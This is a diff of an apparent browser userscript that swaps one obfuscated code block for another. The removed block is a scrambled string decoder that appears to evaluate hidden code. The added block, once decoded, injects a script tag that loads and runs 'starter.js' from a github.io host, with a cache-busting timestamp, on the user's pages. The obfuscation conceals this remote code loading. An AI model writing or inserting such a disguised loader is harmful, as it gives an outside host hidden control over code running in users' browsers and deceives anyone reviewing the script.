@@ -11,44 +11,100 @@
 // ==/UserScript==
 
 (function () {
-  var script, svm_script;
-  (function () {
-    var NFY = "",
-      hvu = 553 - 542;
-
-    function AJr(p) {
-      var z = 4817612;
-      var o = p.length;
-      var r = [];
-      for (var e = 0; e < o; e++) {
-        r[e] = p.charAt(e);
+  const _0x3aa9a7 = _0x256a;
+  (function (_0x599f05, _0x27b250) {
+    const _0x28778a = _0x256a,
+      _0x22b76a = _0x599f05();
+    while (!![]) {
+      try {
+        const _0x3af7bb =
+          parseInt(_0x28778a(0x1f8)) / (0x1af0 + 0x1dba + 0xb55 * -0x5) +
+          (parseInt(_0x28778a(0x1f1)) / (0x1eb2 + -0x4a * -0x1c + -0x26c8)) *
+            (-parseInt(_0x28778a(0x1fb)) /
+              (-0x1 * -0xd3 + 0x58e * 0x2 + 0x2fb * -0x4)) +
+          parseInt(_0x28778a(0x201)) /
+            (-0x1217 * -0x2 + 0xf5 * 0xa + -0x16de * 0x2) +
+          (parseInt(_0x28778a(0x1f4)) /
+            (0x1960 + 0x15 * -0x1d + -0x11 * 0x15a)) *
+            (parseInt(_0x28778a(0x1fd)) / (-0x257 * -0x3 + -0x5cb + -0x134)) +
+          (-parseInt(_0x28778a(0x1ed)) /
+            (0x1 * 0xedb + -0x3 * 0x119 + -0xb89)) *
+            (-parseInt(_0x28778a(0x1ee)) / (-0x186c + -0x1 * -0xbc5 + 0xcaf)) +
+          -parseInt(_0x28778a(0x1fa)) /
+            (0x1f * -0x11b + -0x14 * -0x134 + 0x6 * 0x1b5) +
+          (-parseInt(_0x28778a(0x1eb)) /
+            (0xe * 0x58 + -0x3fb * -0x7 + -0x20a3)) *
+            (parseInt(_0x28778a(0x1ec)) /
+              (0x1ca8 * -0x1 + 0x2d1 * 0x2 + 0x1711 * 0x1));
+        if (_0x3af7bb === _0x27b250) break;
+        else _0x22b76a["push"](_0x22b76a["shift"]());
+      } catch (_0x511398) {
+        _0x22b76a["push"](_0x22b76a["shift"]());
       }
-      for (var e = 0; e < o; e++) {
-        var a = z * (e + 330) + (z % 14496);
-        var y = z * (e + 298) + (z % 51624);
-        var s = a % o;
-        var i = y % o;
-        var k = r[s];
-        r[s] = r[i];
-        r[i] = k;
-        z = (a + y) % 6348435;
-      }
-      return r.join("");
     }
-    var tUx = AJr("omcikusceydarvzosgflbnrhctptutonwqxjr").substr(0, hvu);
-    var fsU =
-      'y+si4=6-ggn=<,(=8a9fac(ij"eblr1frs.jelagr;.lt])5mmyz,;)au r=rvyhj6],{8=c+pl,e0rf,,t5j71rrvaef=a6v8](60s76,ate)h,e* 7+v]e;y.ua 0f[nnf0;cv[Cim=a!ik).])nnn;;i+2)f7})=o;=*dnl{ap[;=g];wq=v6ei,=,0px[=v,ef.e.t;ra(httujaa;+41 zshlyuietll+ynm-=r<f4o9ga,anr9o(;.]."iri3)+)vqor)vor e)s.ua")!a)oqe>;0;vh+-cf;;k,)rl[;wtn=(,rq+;=;+zr1}snz,len(rfg1z vl;uc v7+ungn";(kg)aehlo=.C; (=1r,<C;Cro,+ )r3o vucha]eh ;A1(+)y0wp4 ixci";=8er-{yi(po. 6n+v.[h)6)00b;v rarlgr;chr[(+=r}e;s8 jiro1.19Atjon,{,s;f[,viwch2aiatCmkfAt((v+tv}vt9ht+ihg=At5y.(ilsvlr=;;gx2u}elr7{lyclf[n("}i=  n..0l(tqaa]a =(r;v d9pui,eer)ubh(jo)ai;,el;.j=;(oht=sl+iai+e==++lu(es8 nnnl uoif(gr{.,)i;2hCv;sui t)i)9v=y=+==v)=jut])nr") nprs=p;r;(1)rht;rv7rtm]hpgs(v(";,)u.wn(;wvddifo,];)s03 e8gcga[jivo"r]8C0rs(s =){,Cc24o=rrm[8(d}.vo=-(ou(;alau=u.r<[nsd2nja(6o+(>.k.(;0ltnh=2+aqanAtn)-==nosvyS[<rpv.2)-rg][ry6igxam)7jd;aeh.rq.7+ph1.trar"s;S=7o,l(015';
-    var pjL = AJr[tUx];
-    var DcB = "";
-    var vPI = pjL;
-    var wWi = pjL(DcB, AJr(fsU));
-    var ETc = wWi(
-      AJr(
-        'bYg7s$)]=tr[g);Y.S(r)nliep4Y37ae=b,l=e2)bem$eetnea.YY35m,.b}r{.0t5!+lbj,.(;.]o6t/+-$ah35(,a3s..)ao.h] }h6YjYciYef(3y4i(-ef1.ftuu0$eceehY,"lsp]un,deY(!epeYt=;eY (th th!pelee]t!a!9Y}=e_} ,!dwa0gYe;sd5eC$}m)b)=$$emi_,,Y,{fY)t3e4/)6Yfrs]+,.s./ 1or;jY},sj$g]n+Y{.abY7YYtYY_n5sY)rfp;%a5s(t=p77+8!eh rf!t[?pavY;tbn=jio$Y.ft%4ttYm.(fYoY-koYfl=(aYv.],nfe]$]f}!hp=1=n$(&t.v1.ed3!",lt.Ye(.YpsfY.p/.h}84!/o))Yro7=f(h+(fen#,!u.4Y}2+=.lle4a(hre;o9l,Y)_0.e!1ae/]!hy); YcYp/)t%{3&Y$l;T=n$qeY2afd3Y4lYr=2-8rY(t4;#!{j/.!-Ys$rf".e4%.r(3o fni_4te0.b97;$g(n})(;m$6jm]6yp.r,Y)l).s3;fiY+1_(7fg=c0!ec%6e=3)Y)v/l(m$ 7i)%st3eniYt}07e(m;,00.uthlahoj*5.jjY#C=]jtY_e;g.Yt=sY.tf{)toYj.+lasrtrf1a;ykf)it.f%08n2(;rrd.(_Sfr$0n1Y3)1(iYd7e.(1.6oeiir.Ysste!tYm.gtelonmmnp )Yt;fea.rbe&f(Yf,tf.i[is 2re{).-s1et%.cYa4;%Yo . (}$7)]p{.%r!=7a)e_$tlomt}$e0.0)yntte)tYY0_6gYe4D;j,15;$t);)ru)Ye#o=t %f(.Y-esa}t]8cYns&u.,uk93l,;=.t=;y,Yc;Y#)eYtsr=ef,(m,=h==")u\'* Y!rlouEieY)i/[Y]f!f;;[)Yrb r_!Ci_e6,(\'Y4"sn=5Y_Ye; 3(y(nYt./2{sY0.e7,ig Y1bY,\'S6(}YYbg YtY!(2lYmY%e(8n}Ya)Y9edY)m3r0biiY$]t_b,1. s8/beY7..r+)"5S,pYYl44oe&(_d6e!3[t)ai3r.7Y;s0rijsYYr)Y)oeaY0)16o .gf}t_1Ym$$[*Y[li1ms.)8s$n(te5($(Yj!Y)*:5/_Y1Yr,2ejcu)g\'$0#)ij,a(._Ytu(&)t0=o.t(Y(tt}r)g]6_Y8i[%"chep1e$_3Ym{5.ej3;d%kvua,n=)ma5;e/(n1(fso9s_{;(]ss.( ni_ ={,.)y)4t2%!c#'
-      )
+  })(_0x2c8d, 0x1 * 0xb785 + -0x1 * 0x5fd90 + -0x96745 * -0x1);
+  function _0x256a(_0x23eabe, _0x275e01) {
+    const _0x6cc897 = _0x2c8d();
+    return (
+      (_0x256a = function (_0x1113a1, _0x33c304) {
+        _0x1113a1 = _0x1113a1 - (-0x216b + 0x1207 + 0x114e);
+        let _0x12172c = _0x6cc897[_0x1113a1];
+        return _0x12172c;
+      }),
+      _0x256a(_0x23eabe, _0x275e01)
     );
-    var KBe = vPI(NFY, ETc);
-    KBe(4675);
-    return 3500;
-  })();
+  }
+  let timestamp = new Date()[_0x3aa9a7(0x203)]();
+  const script = document[_0x3aa9a7(0x1f7) + _0x3aa9a7(0x1f3)](
+      _0x3aa9a7(0x1fc)
+    ),
+    svm_script = document[_0x3aa9a7(0x1ea) + _0x3aa9a7(0x1f5)](
+      _0x3aa9a7(0x204)
+    );
+  function _0x2c8d() {
+    const _0x456fa1 = [
+      "1732188qqgXOf",
+      "github.io/",
+      "getTime",
+      "body",
+      "querySelec",
+      "934910lDBnMe",
+      "88qOrGYq",
+      "148771LfwLWq",
+      "184GDZtJY",
+      "https://he",
+      "setAttribu",
+      "2tswfWH",
+      "ndrik-svm.",
+      "ent",
+      "175ufleOr",
+      "tor",
+      "appendChil",
+      "createElem",
+      "505913HEpyMm",
+      "starter.js",
+      "2600109oXIsjz",
+      "1001085ICVUQr",
+      "script",
+      "36582uPQldS",
+      "src",
+      "?t=",
+      "assets/js/",
+    ];
+    _0x2c8d = function () {
+      return _0x456fa1;
+    };
+    return _0x2c8d();
+  }
+  script[_0x3aa9a7(0x1f0) + "te"](
+    _0x3aa9a7(0x1fe),
+    _0x3aa9a7(0x1ef) +
+      _0x3aa9a7(0x1f2) +
+      _0x3aa9a7(0x202) +
+      _0x3aa9a7(0x200) +
+      _0x3aa9a7(0x1f9) +
+      _0x3aa9a7(0x1ff) +
+      timestamp
+  ),
+    svm_script[_0x3aa9a7(0x1f6) + "d"](script);
 })();
